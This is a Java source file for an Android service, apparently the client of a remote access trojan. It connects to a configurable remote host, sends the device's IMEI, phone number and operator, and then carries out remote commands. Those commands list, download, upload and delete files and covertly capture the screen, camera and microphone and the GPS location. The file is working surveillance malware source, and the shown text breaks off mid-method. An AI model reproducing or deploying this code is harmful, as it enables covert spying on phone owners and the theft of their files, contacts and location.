package com.qooport.android;

import android.app.AlarmManager;
import android.app.PendingIntent;
import static android.content.ContentValues.TAG;
import android.content.Intent;
import android.util.Log;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Locale;
import java.util.logging.Level;
import java.util.logging.Logger;
import comunes.Archivo;
import java.io.FileReader;
import static java.lang.Thread.sleep;
import java.net.URISyntaxException;
import com.qooport.android.servidor.CapturaMicrofono;
import com.qooport.android.servidor.CapturaPantalla;
import com.qooport.android.servidor.EnviarArchivo;
import com.qooport.android.servidor.RecibirArchivo;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Looper;
import android.view.Display;
import android.view.SurfaceHolder;
import android.view.WindowManager;
import comunes.GPSPosicion;
import comunes.WebCamItem;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import com.qooport.android.servidor.CapturaCamara;
import static com.qooport.android.servidor.CapturaPantalla.redimensionar_rotar;
import com.qooport.android.servidor.GestorContactos;
import com.qooport.android.servidor.GestorLlamadas;
import com.qooport.android.servidor.GestorSMS;
import com.qooport.android.servidor.util.InformacionSistema;
import com.qooport.android.utilidades.Compresor;
import com.qooport.android.utilidades.Protocolo;
import com.qooport.android.utilidades.cifrado.Encriptacion;
import comunes.Comando;
import java.util.zip.GZIPOutputStream;

public class Servicio extends Service {

    private Socket conexion;
    private OutputStream salida;
    private InputStream entrada;
    private ObjectOutputStream enviarObjeto;
    private ObjectInputStream recibirObjeto;
    private boolean conectado;
    private CapturaMicrofono microfono;
    private CapturaPantalla pantalla;
    private String host;
    private String password;
    private int puerto;
    private int puertoTransferencias;
    private String prefijo;
    private int delayConexion;
    private boolean esperar;
    private GPSPosicion ubicacion;
    private Context contexto;
    private Principal actividad;
    private CapturaCamara webC;
    private SurfaceHolder mSurfaceHolder;
    private int orientacion = 1; //1 vertical, 2 orizontal 
    private boolean destruido = false;

    public Servicio() {
        super();
    }

    public Servicio(Principal actividad, Context contexto) {
        super();
        this.actividad = actividad;
        this.contexto = contexto;
    }

    public Servicio(Principal actividad, Context contexto, SurfaceHolder holder, String host, String password, int puerto, int puertoTransferencias, String prefijo, int delayConexion) {
        super();
        this.actividad = actividad;
        this.contexto = contexto;
        this.host = host;
        this.password = password;
        this.puerto = puerto;
        this.puertoTransferencias = puertoTransferencias;
        this.prefijo = prefijo;
        this.delayConexion = delayConexion;
        this.mSurfaceHolder = holder;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "SE CREO EL SERVICIO");
        this.contexto = this.getApplicationContext();
        destruido = false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) {
            return START_STICKY;
        }
        String who = intent.getAction();
        Log.i(TAG, "iniciadio por : " + who);
        if (intent.hasExtra("DNS")) {
            this.host = intent.getExtras().getString("DNS");
        }
        if (intent.hasExtra("PUERTO1")) {
            this.puerto = intent.getExtras().getInt("PUERTO1");
        }
        if (intent.hasExtra("PUERTO2")) {
            this.puertoTransferencias = intent.getExtras().getInt("PUERTO2");
        }
        if (intent.hasExtra("PASSWORD")) {
            this.password = intent.getExtras().getString("PASSWORD");
        }
        if (intent.hasExtra("PREFIJO")) {
            this.prefijo = intent.getExtras().getString("PREFIJO");
        }
        if (intent.hasExtra("DELAY")) {
            this.delayConexion = intent.getExtras().getInt("DELAY");
        }
        if (prefijo == null) {
            prefijo = "";
        }
        if (!conectado) {
            conectar();
        }
        esperar = true;
        hiloPrincipal.start();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "in onDestroy");
//        unregisterReceiver(ConnectivityCheckReceiver);
        try {
            conexion.close();
        } catch (IOException ex) {
            Logger.getLogger(Servicio.class.getName()).log(Level.SEVERE, null, ex);
        }
        esperar = false;
        destruido = true;
        stopSelf();
        super.onDestroy();
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String getPrefijo() {
        return prefijo;
    }

    public void setPrefijo(String prefijo) {
        this.prefijo = prefijo;
    }

    public int getDelayConexion() {
        return delayConexion;
    }

    public void setDelayConexion(int delayConexion) {
        this.delayConexion = delayConexion;
    }

    public boolean isEsperar() {
        return esperar;
    }

    public void setEsperar(boolean esperar) {
        this.esperar = esperar;
    }

    public Principal getActividad() {
        return actividad;
    }

    public void setActividad(Principal actividad) {
        this.actividad = actividad;
    }

    public void iniciar() {
        Log.i(TAG, "METODO INICIAR SERVICIO");
        if (prefijo == null) {
            prefijo = "";
        }
        if (!conectado) {
            conectar();
        }
        esperar = true;
        if (!hiloPrincipal.isAlive() || hiloPrincipal.isInterrupted()) {
            hiloPrincipal.start();
        }
    }

    private void inicializarObjectos() {
        conexion = null;
        this.entrada = null;
        this.salida = null;
        this.enviarObjeto = null;
        this.recibirObjeto = null;
    }

    private void conectar() {
        try {
            inicializarObjectos();
            conectado = false;
            conexion = new Socket(host, puerto);
            this.entrada = this.conexion.getInputStream();
            this.salida = this.conexion.getOutputStream();
            this.enviarObjeto = new ObjectOutputStream(this.salida);
            this.recibirObjeto = new ObjectInputStream(this.entrada);
            this.enviarInfo();
            conectado = true;
        } catch (IOException ex) {
            conectado = false;
        }
    }

    public void CierraConexion() {
        try {
            this.enviarObjeto.close();
            this.recibirObjeto.close();
            this.entrada.close();
            this.salida.close();
            this.conexion.close();
        } catch (IOException ex) {
        }
        conectado = false;
    }

    public String getImei() {
        StringBuilder imei = new StringBuilder();
        try {
            InformacionSistema info = new InformacionSistema(contexto);
            imei.append(info.getIMEI());
        } catch (Exception e) {
            imei.append(Math.round(Math.random() * 1000.0D));
        }
        return imei.toString();
    }

    private void enviarInfo() {
        try {
            String usuario = System.getProperty("user.name");
            if (usuario == null || usuario.isEmpty()) {
                usuario = android.os.Build.MODEL.replace(" ", "");
            }
            String so = "Android " + android.os.Build.VERSION.RELEASE;
            String jre = System.getProperty("java.runtime.version");
            String version = Principal.version;
            String iplocal = this.getLocalIp();
            String ipexterna = "ipexterna"; // la ip externa la obtiene el cliente
            Principal.identificador = android.os.Build.MODEL.replace(" ", "") + "-" + this.getImei(); // + "-(" + Principal.version + ")";
            String identificador = Principal.identificador;
            String pais = Locale.getDefault().getDisplayCountry();
            String paisSig = Locale.getDefault().getCountry();
            String hostname = this.getHostName();
            String tieneCam = Camera.getNumberOfCameras() > 0 ? "SI (" + Camera.getNumberOfCameras() + ")" : "NO";
            this.enviarComando(Protocolo.info, pais + "#" + paisSig + ":" + identificador + ":" + ipexterna + ":" + iplocal + ":" + usuario + ":" + hostname + ":" + tieneCam + ":" + so + ":" + jre + ":" + version);
        } catch (Exception e) {
        }
    }

    private void enviarInfoCompleta() {
        try {
            StringBuilder informacion = new StringBuilder();
            InformacionSistema info = new InformacionSistema(contexto);
            informacion.append("Modelo : ").append(android.os.Build.MODEL.replace(" ", "")).append("\n");
            informacion.append("Version Android : ").append(android.os.Build.VERSION.RELEASE).append("\n");
            informacion.append("API Level: ").append(android.os.Build.VERSION.SDK).append("\n");
            informacion.append("IMEI: ").append(info.getIMEI()).append("\n");
            informacion.append("Numero telefonico: ").append(info.getPhoneNumber()).append("\n");
            informacion.append("Operador: ").append(info.getOperatorName()).append("\n");
            informacion.append("Sim Country code: ").append(info.getSimCountryCode()).append("\n");
            informacion.append("Sim Operador code: ").append(info.getSimOperatorCode()).append("\n");
            informacion.append("Tiene Cams: ").append(Camera.getNumberOfCameras() > 0 ? "SI (" + Camera.getNumberOfCameras() + ")" : "NO").append("\n");
            this.enviarComando(Protocolo.infoCompleta, this.comprimirObjecto(informacion.toString()));
        } catch (Exception e) {
        }
    }

    private String getHostName() {
        try {
            InetAddress iAddress = null;
            try {
                iAddress = InetAddress.getLocalHost();
            } catch (UnknownHostException ex) {
                Logger.getLogger(Servicio.class.getName()).log(Level.SEVERE, null, ex);
            }
            String hostname = iAddress.getHostName();
            if (hostname != null) {
                return hostname;
            }
            hostname = iAddress.getCanonicalHostName();
            if (hostname != null) {
                return hostname;
            }
            hostname = System.getenv("COMPUTERNAME");
            if (hostname != null) {
                return hostname;
            }
            hostname = System.getenv("HOSTNAME");
            if (hostname != null) {
                return hostname;
            }
        } catch (Exception e) {
        }
        return this.conexion.getLocalAddress().getHostName();
    }

    private String getLocalIp() {
        try {
            InetAddress iAddress = null;
            try {
                iAddress = InetAddress.getLocalHost();
            } catch (UnknownHostException ex) {
            }
            String hostname = null;
            if (iAddress != null) {
                hostname = iAddress.getHostAddress();
            }
            if (hostname != null) {
                return hostname;
            }
        } catch (Exception e) {
        }
        return this.conexion.getLocalAddress().getHostAddress();
    }

    private void enviarUnidades() {
        try {
            Archivo[] a = null;
            File[] ar = File.listRoots();
            if (ar != null) {
                if (ar.length > 0) {
                    a = new Archivo[ar.length];
                    for (int p = 0; p < ar.length; p++) {
                        a[p] = new Archivo();
                        a[p].setLength(ar[p].length());
                        a[p].setNombre(ar[p].getName());
                        a[p].setCarpeta(ar[p].isDirectory());
                        a[p].setPath(ar[p].getAbsolutePath());
                        a[p].setTipo(this.getExtension(ar[p].getName()));
                        a[p].setFecha(ar[p].lastModified());
                        a[p].setIcono(this.sacarIcono(ar[p]));
                        a[p].setPathParent("");
                    }
                } else {
                    a = null;
                }
            } else {
                a = null;
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream objectOut = new ObjectOutputStream(baos);
            objectOut.writeObject(a);
            objectOut.close();
            byte[] bytes = baos.toByteArray();
            this.enviarComando(Protocolo.listarDrives);
            this.enviarObjeto(Compresor.comprimirGZIP(bytes));
        } catch (IOException ex) {
            this.enviarMensaje("ERROR AL LISTAR UNIDADES:" + ex.getMessage());
        } finally {
        }
    }

    private String getExtension(String filename) {
        int index = filename.lastIndexOf('.');
        if (index == -1) {
            return "";
        } else {
            return filename.substring(index + 1);
        }
    }

    private byte[] sacarIcono(File f) {
        return null;
//        try {
//            ImageIcon mmm = (ImageIcon) FileSystemView.getFileSystemView().getSystemIcon(f);
//            BufferedImage im = new BufferedImage(mmm.getIconWidth(), mmm.getIconHeight(), 3);
//            im.createGraphics().drawImage(mmm.getImage(), 0, 0, null);
//            ByteArrayOutputStream ara = new ByteArrayOutputStream();
//            try {
//                ImageIO.write(im, "jpg", ara);
//                ara.close();
//            } catch (IOException ex) {
//            }
//            return ara.toByteArray();
//        } catch (Exception e) {
//            return null;
//        }
    }

    private void enviarThumbail(String ruta) {
        try {
            File ttumbnail = new File(ruta);
            String nombre = ttumbnail.getName().toLowerCase();
            if ((ttumbnail.isFile()) && ((nombre.contains(".jpg")) || (nombre.contains(".png"))
                    || (nombre.contains(".jpeg")) || (nombre.contains(".gif")) || (nombre.contains(".ico"))
                    || (nombre.contains(".bmp")))) {
                try {
                    Bitmap bitmap = BitmapFactory.decodeFile(ttumbnail.getAbsolutePath());
                    if (bitmap == null) {
                        return;
                    }
                    bitmap = redimensionar_rotar(bitmap, 100, 100, orientacion);
                    ByteArrayOutputStream os1 = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, (int) 75, os1);
                    this.enviarComando(Protocolo.thumbail);
                    this.enviarObjeto(Compresor.comprimirGZIP(os1.toByteArray()));
                    os1.close();
                } catch (IOException ex) {
                }
            }
        } catch (Exception e) {
        }
    }

//    public void album(View screen1) {
//        try {
//            if (screen1 == null) {
//                this.enviarMensaje("MINIATURA: la pantalla vino nulo");
//                return;
//            }
//            View screen = screen1.getRootView();
////        View screen = (View) new CameraView().findViewById(R.id.screen);
//            screen.setDrawingCacheEnabled(true);
//            Bitmap bmScreen = screen.getDrawingCache();
//            ByteArrayOutputStream os = new ByteArrayOutputStream();
//            try {
//                bmScreen.compress(Bitmap.CompressFormat.JPEG, 90, os);
//                os.close();
//            } catch (FileNotFoundException e) {
//                e.printStackTrace();
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
//            screen.setDrawingCacheEnabled(false);
//            this.enviarMensaje("SE ENVIA SUPUESTAMENTE BIEN LA PANTALLA");
//            this.enviarComando(Protocolo.pantallaMiniatura);
//            this.enviarObjeto(Compresor.comprimirGZIP(os.toByteArray()));
//        } catch (IOException ex) {
//            ex.printStackTrace();
//            Logger.getLogger(Servicio.class.getName()).log(Level.SEVERE, null, ex);
//        }
//    }
    public static String nombreHora() {
        SimpleDateFormat sdf = new SimpleDateFormat("ddMMyyyyHHmmss");
        return sdf.format(new Date());
    }

    private void enviarListaMonitores() {
        try {
            String[] datos = new String[1];
            WindowManager wm = (WindowManager) contexto.getSystemService(Context.WINDOW_SERVICE);
            Display display = wm.getDefaultDisplay();
//            informacion.append("Monitores : ").append(monitores.length).append("\n");
            datos[0] = "" + 0 + ":" + display.getWidth() + ":" + display.getHeight();
            this.enviarComando(Protocolo.listarMonitores);
            this.enviarObjeto(this.comprimirObjecto(datos));
        } catch (Exception e) {
        }
    }

    private void enviarMiniatura() {
        new Thread() {
            @Override
            public void run() {
                try {
                    byte[] bytes = CapturaPantalla.getScreen(40, 75, orientacion);
                    if (bytes != null) {
                        Servicio.this.enviarComando(Protocolo.pantallaMiniatura);
                        Servicio.this.enviarObjeto(Compresor.comprimirGZIP(bytes));
                    }
                } catch (Exception ex) {
                }
            }
        }.start();
    }

    private void enviarWebCamMiniatura() {
        new Thread(new Runnable() {
            public void run() {
                try {
                    if (webC == null) {
                        webC = new CapturaCamara(Servicio.this, mSurfaceHolder);
                        webC.setCameraNumber("1");//frontal
                        webC.setCalidad(40);
                        webC.setFormato(4);
                        webC.setTipo("jpg");
                    }
                    webC.tomarFotoVistaPrevia();
//                    wci.cerrar();
                } catch (Exception ex) {
                    enviarMensaje("ERRO MINIATURA WC " + ex.getMessage());
                }
            }
        }).start();
    }

    private void listarArchivos(String ruta) {
        try {
            File t = new File(ruta);
            Archivo[] a = null;
            if (t.isDirectory()) {
                File[] ar = t.listFiles();
                if (ar != null) {
                    if (ar.length > 0) {
                        a = new Archivo[ar.length];
                        for (int p = 0; p < ar.length; p++) {
                            a[p] = new Archivo();
                            a[p].setLength(ar[p].length());
                            a[p].setNombre(ar[p].getName());
                            a[p].setCarpeta(ar[p].isDirectory());
                            a[p].setPath(ar[p].getAbsolutePath());
                            a[p].setTipo(this.getExtension(ar[p].getName()));
                            a[p].setFecha(ar[p].lastModified());
                            a[p].setIcono(this.sacarIcono(ar[p]));
                            String m = ar[p].getParent();
                            m = m.replace("\\", "/");
                            a[p].setPathParent(m);
                        }
                    } else {
                        a = null;
                    }
                } else {
                    a = null;
                }
            }
            if (t.isFile()) {
                a = null;
            }
            this.enviarComando(Protocolo.listarDirectorio);
            this.enviarObjeto(this.comprimirObjecto(a));
        } catch (Exception e) {
        }
    }

    public Object descomprimirObjeto(byte[] bytes) {
        ObjectInputStream objectIn = null;
        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(Compresor.descomprimirGZIP(bytes));
            objectIn = new ObjectInputStream(bais);
            return (Object) objectIn.readObject();
        } catch (IOException ex) {
        } catch (ClassNotFoundException ex) {
        } finally {
            try {
                objectIn.close();
            } catch (IOException ex) {
            }
        }
        return null;
    }

    public byte[] comprimirObjecto(Object objeto) {
        byte[] bytes = null;
        ObjectOutputStream objectOut = null;
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            objectOut = new ObjectOutputStream(baos);
            objectOut.writeObject(objeto);
            objectOut.close();
            bytes = Compresor.comprimirGZIP(baos.toByteArray());
        } catch (IOException ex) {
            Logger.getLogger(Servicio.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                objectOut.close();
            } catch (IOException ex) {
                Logger.getLogger(Servicio.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        return bytes;
    }

    private void eliminar(String ruta) {
        try {
            File t = new File(ruta);
            t.getAbsoluteFile().delete();
            t.delete();
        } catch (Exception e) {
        }
    }

    //procesa el patron <server> generalmente usado para subir plugins
    private static String procesaNombreCarpeta(String ruta) {
        try {
            File server = new File(Principal.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            String rutaServer = server.getParent();
            rutaServer = rutaServer.replaceAll("\\\\", "/");
            ruta = ruta.replaceAll("<server>", rutaServer);
            return ruta;
        } catch (URISyntaxException ex) {
            Logger.getLogger(Servicio.class.getName()).log(Level.SEVERE, null, ex);
            return ruta;
        }
    }

    private void reiniciarAplicacion() {
        try {
            Intent mStartActivity = new Intent(contexto, Principal.class);
            int mPendingIntentId = 123456;
            PendingIntent mPendingIntent = PendingIntent.getActivity(contexto, mPendingIntentId, mStartActivity, PendingIntent.FLAG_CANCEL_CURRENT);
            AlarmManager mgr = (AlarmManager) contexto.getSystemService(Context.ALARM_SERVICE);
            mgr.set(AlarmManager.RTC, System.currentTimeMillis() + 100, mPendingIntent);
            System.exit(0);
        } catch (Exception e) {
        }
    }

    public String getArchivoTexto(String ruta) {
        FileReader fr = null;
        BufferedReader br = null;
        StringBuilder contenido = new StringBuilder();
        try {
            fr = new FileReader(ruta);
            br = new BufferedReader(fr);
            String linea;
            while ((linea = br.readLine()) != null) {
                contenido.append(linea);
                contenido.append("\n");
            }
        } catch (IOException e) {
            contenido = new StringBuilder("n/a");
        } finally {
            try {
                br.close();
            } catch (Exception ex) {
            }
        }
        return contenido.toString();
    }

    public void listarProcesos() {
//        android.os.Process.
    }

    public static Comando crearComando(int comando, int nParametros, Object objeto) {
        try {
            return new Comando(comando, nParametros, objeto);
        } catch (Exception ex) {

        }
        return null;
    }

    public void enviarComando(int i, Object... cmd) {
        enviarObjeto(comprimirObjecto(crearComando(i, cmd.length, cmd)));
    }

    public void enviarMensaje(String mensaje) {
        this.enviarComando(Protocolo.MENSAJE_SERVIDOR, mensaje);
    }

    public void enviarObjeto(Object objeto) {
        try {
            this.enviarObjeto.writeObject(objeto);
            this.enviarObjeto.flush();
        } catch (IOException ex) {
        }
    }

    public void enviarObjetoParcial(byte[] buffer, int off, int len) {
        try {
            this.enviarObjeto.write(buffer, off, len);
        } catch (IOException ex) {
        }
    }

    public void enviarFlush() {
        try {
            this.enviarObjeto.flush();
        } catch (IOException ex) {
        }
    }

    public boolean isConectado() {
        return conectado;
    }

    public void setConectado(boolean conectado) {
        this.conectado = conectado;
    }

    public String getHost() {
        return host;
    }

    public void setHost(String host) {
        this.host = host;
    }

    public int getPuerto() {
        return puerto;
    }

    public void setPuerto(int puerto) {
        this.puerto = puerto;
    }

    public int getPuertoTransferencias() {
        return puertoTransferencias;
    }

    public void setPuertoTransferencias(int puertoTransferencias) {
        this.puertoTransferencias = puertoTransferencias;
    }

    private void enviarArchivos(String rutaArchivo) {
        File f = new File(rutaArchivo);
        if (f.exists()) {
            if (!f.isDirectory()) {
                EnviarArchivo envArchiv = new EnviarArchivo(rutaArchivo, this);
                envArchiv.start();
            } else //si es un directorio listo los archivos y los envio
            {
                for (File ff : f.listFiles()) {
                    enviarArchivos(ff.getAbsolutePath());
                }
            }
        }
    }

    public void enviarEstadoLlamada(int estado, String numero) {
        this.enviarComando(Protocolo.estadoLlamada, "" + estado + ":" + numero);
    }

    private boolean verSiTieneCamara(Context context) {
        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            // this device has a camera
            return true;
        } else {
            // no camera on this device
            return false;
        }
    }

    private void enviarListaWebCams() {
        try {
            if (this.verSiTieneCamara(contexto)) {
                boolean frontal = false;
                boolean trasera = false;
                int i = 0;
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                i = Camera.getNumberOfCameras();
                for (int camIdx = 0; camIdx < i; camIdx++) {
                    Camera.getCameraInfo(camIdx, cameraInfo);
                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                        try {
                            trasera = true;
                        } catch (RuntimeException e) {
                        }
                    }
                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        try {
                            frontal = true;
                        } catch (RuntimeException e) {
                        }
                    }
                }
                WebCamItem[] p = new WebCamItem[i];
                if (frontal) {
                    p[0] = new WebCamItem();
                    p[0].setCodigo(1);
                    p[0].setNombre("Frontal");
                }
                if (trasera) {
                    p[i - 1] = new WebCamItem();
                    p[i - 1].setCodigo(0);
                    p[i - 1].setNombre("Trasera");
                }
                if (p != null && p.length > 0) {
                    this.enviarComando(Protocolo.listarWebCams);
                    this.enviarObjeto(this.comprimirObjecto(p));
                } else {
                    System.out.println("NO HAY WEBCAMS");
                }
            } else {
            }
        } catch (Exception e) {
        }
    }

    public static String leerCadena(byte[] cadena) {
        try {
            return Encriptacion.descifra(Compresor.descomprimirGZIP(cadena));
        } catch (Exception ex) {
            return "";
        }
    }

    private String conseguirMejorProveedor() {
        LocationManager locationManager = (LocationManager) contexto.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        Criteria criteria = new Criteria();
        criteria.setPowerRequirement(Criteria.POWER_LOW); // Chose your desired power consumption level.
        criteria.setAccuracy(Criteria.ACCURACY_FINE); // Choose your accuracy requirement.
        criteria.setSpeedRequired(true); // Chose if speed for first location fix is required.
        criteria.setAltitudeRequired(false); // Choose if you use altitude.
        criteria.setBearingRequired(false); // Choose if you use bearing.
        criteria.setCostAllowed(false); // Choose if this provider can waste money :-)
        // Provide your criteria and flag enabledOnly that tells
        // LocationManager only to return active providers.
        return locationManager.getBestProvider(criteria, true);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
//        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    public Context getContexto() {
        return contexto;
    }

    public void setContexto(Context contexto) {
        this.contexto = contexto;
    }

    public SurfaceHolder getmSurfaceHolder() {
        return mSurfaceHolder;
    }

    public void setmSurfaceHolder(SurfaceHolder mSurfaceHolder) {
        this.mSurfaceHolder = mSurfaceHolder;
    }
    Thread hiloPrincipal = new Thread() {
        Location location;
        LocationManager locManager;
        LocationListener locListener;

        @Override
        public void run() {
            try {
                Looper.prepare();
                String provedorUbicacion;
                provedorUbicacion = conseguirMejorProveedor();
                Log.i("Servicio", "EL MEJOR PROVEDOR DE LOCALIZACION ES:" + provedorUbicacion);
                if (provedorUbicacion == null || provedorUbicacion.isEmpty()) {
                    provedorUbicacion = LocationManager.NETWORK_PROVIDER;
                }
                Log.i("Servicio", "SE INICIA SERVICIO CON PROVEDOR DE LOCALIZACION :" + provedorUbicacion);
                while (esperar) {
                    try {
                        if (!conectado) {
                            //si no esta conectado espero el delay de conexion e intento conectar
                            try {
                                sleep(delayConexion);
                            } catch (InterruptedException ex) {
                            }
                            conectar();
                        }
                        if (conectado) {
                            int comando;
                            comando = recibirObjeto.readInt();
                            Log.i("Servidor", "Llego el comando :" + comando);
                            switch (comando) {
                                case Protocolo.listarDrives:
                                    Servicio.this.enviarUnidades();
                                    break;
                                case Protocolo.listarDirectorio:
                                    String ruta = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    Servicio.this.listarArchivos(ruta);
                                    break;
                                case Protocolo.thumbail:
                                    String arcThumbail = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    Servicio.this.enviarThumbail(arcThumbail);
                                    break;
                                case Protocolo.descargar:
                                    String archivo = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    Servicio.this.enviarArchivos(archivo);
                                    break;
                                case Protocolo.eliminar:
                                    String archivoAEliminar = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    Servicio.this.eliminar(archivoAEliminar);
                                    break;
                                case Protocolo.pantallaMiniatura:
                                    Servicio.this.enviarMiniatura();
                                    break;
                                case Protocolo.webCamMiniatura:
                                    Servicio.this.enviarWebCamMiniatura();
                                    break;
                                case Protocolo.ejecutar:
                                    String archivoAEjecutar = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    File tt = new File(archivoAEjecutar);
//                            try {
//                                Desktop.getDesktop().open(tt.getAbsoluteFile());
//                            } catch (IOException e) {
////                                e.printStackTrace();
////                                this.enviarMensaje("error al ejecutar " + e.getMessage());
//                            }
                                    break;
                                case Protocolo.crearCarpeta:
                                    try {
                                        String nomCarpeta = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                        String rutaAcrear = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                        rutaAcrear = procesaNombreCarpeta(rutaAcrear);
                                        File carpeta = new File(rutaAcrear, nomCarpeta);
                                        carpeta.mkdir();
                                    } catch (Exception e) {
                                    }
                                    break;
                                case Protocolo.subir:
                                    try {
                                        String archivoAsubir = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                        String rutaAsubir = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                        rutaAsubir = procesaNombreCarpeta(rutaAsubir);
                                        RecibirArchivo recibArchiv = new RecibirArchivo(archivoAsubir, rutaAsubir, Servicio.this);
                                        recibArchiv.start();
                                    } catch (Exception e) {
                                    }
                                    break;
                                case Protocolo.subirServidor:
                                    try {
                                        String servidorAsubir = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                        String rutaAsubirServidor = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                        rutaAsubirServidor = procesaNombreCarpeta(rutaAsubirServidor);
                                        RecibirArchivo recibServidor = new RecibirArchivo(servidorAsubir, rutaAsubirServidor, true, Servicio.this);
                                        recibServidor.start();
                                    } catch (Exception e) {
                                    }
                                    break;
                                case Protocolo.info:
                                    Servicio.this.enviarInfo();
                                    break;
                                case Protocolo.infoCompleta:
                                    Servicio.this.enviarInfoCompleta();
                                    break;
                                case Protocolo.listarMonitores:
                                    Servicio.this.enviarListaMonitores();
                                    break;
                                case Protocolo.reiniciar:
                                    Servicio.this.reiniciarAplicacion();
                                    break;
                                case Protocolo.apagarServidor:
                                    System.exit(0);
                                    break;
                                case Protocolo.ping:
                                    Servicio.this.enviarComando(Protocolo.pong);
                                    break;
                                case Protocolo.listarProcesos:
                                    listarProcesos();
                                    break;
                                case Protocolo.capturaPantalla:
                                    try {
                                        String dat = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                        String[] parametros = dat.split(":");
                                        if (pantalla == null) {
                                            pantalla = new CapturaPantalla(Servicio.this);
                                            pantalla.setScala(Integer.parseInt(parametros[0]));
                                            pantalla.setCalidad(Float.parseFloat(parametros[1]));
                                            pantalla.start();
                                        } else {
                                            pantalla.setScala(Integer.parseInt(parametros[0]));
                                            pantalla.setCalidad(Float.parseFloat(parametros[1]));
                                            if (pantalla.isInterrupted()) {
                                                pantalla.start();
                                            }
                                        }
                                    } catch (Exception e) {
                                        Log.i("PANTALLA", "Error: " + e.getMessage());
                                    }
                                    break;
                                case Protocolo.detenerPantalla:
                                    if (pantalla != null) {
                                        pantalla.detener();
                                        pantalla = null;
                                    }
                                    break;
                                case Protocolo.capturaWebCam:
                                    String dat2 = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    String[] parametros2 = dat2.split(":");
                                    if (webC != null) {
                                        webC.setCalidad(Float.parseFloat(parametros2[2]));
                                        webC.setFormato(Integer.parseInt(parametros2[1]));
                                        webC.setTipo(parametros2[0]);
                                    }
                                    break;
                                case Protocolo.abrirWebCam:
                                    String nombreCam = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    String cam;
                                    if (nombreCam.equals("Frontal")) {
                                        cam = "1";
                                    } else {
                                        cam = "0";
                                    }
                                    if (webC == null) {
                                        webC = new CapturaCamara(Servicio.this, mSurfaceHolder);
                                        webC.setCameraNumber(cam);
                                        webC.setCalidad(40);
                                        webC.setFormato(4);
                                        webC.setTipo("jpg");
                                        webC.start();
                                    } else {
                                        webC.detener();
                                        webC.setCameraNumber(cam);
                                        webC.paso1();
                                        webC.paso2();
                                        webC.setCalidad(40);
                                        webC.setFormato(4);
                                        webC.setTipo("jpg");
                                        if (webC.isInterrupted()) {
                                            webC.start();
                                        }
                                        Log.i("Servicio", "YA TERMINE DE ABRIR LA CAMARA ");
                                    }
                                    break;
                                case Protocolo.cerrarWebCam:
                                    if (webC != null) {
                                        webC.detener();
                                        webC = null;
                                    }
                                    break;
                                case Protocolo.listarWebCams:
                                    Servicio.this.enviarListaWebCams();
                                    break;
                                case Protocolo.capturaMicrofono:
                                    String tipo = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    try {
                                        microfono = new CapturaMicrofono(Servicio.this);
                                        microfono.abrir(tipo);
                                        microfono.start();
                                    } catch (Exception e) {
                                        if (microfono != null) {
                                            microfono.cerrar();
                                            microfono = null;
                                        }
                                    }
                                    break;
                                case Protocolo.detenerMicrofono:
                                    if (microfono != null) {
                                        microfono.cerrar();
                                        microfono = null;
                                    }
                                    break;
                                case Protocolo.activarGPS:
                                    String provedor = Servicio.leerCadena((byte[]) recibirObjeto.readObject());
                                    if (provedor.equals("Mejor")) {
                                        provedor = Servicio.this.conseguirMejorProveedor();
                                        if (provedor == null || provedor.equals("")) {
                                            provedor = LocationManager.NETWORK_PROVIDER;
                                        }
                                    }
                                    provedorUbicacion = provedor;
                                    try {
                                        locManager.removeUpdates(locListener);
                                    } catch (Exception e) {
                                    }
                                    //   PREPARO LO NECESARIO PARA LA LOCALIZACION GPS
                                    locManager = (LocationManager) contexto.getSystemService(Context.LOCATION_SERVICE);
                                    locListener = new LocationListener() {
                                        public void onLocationChanged(Location locationNueva) {
                                            location = locationNueva;
                                        }

                                        public void onProviderDisabled(String provider) {
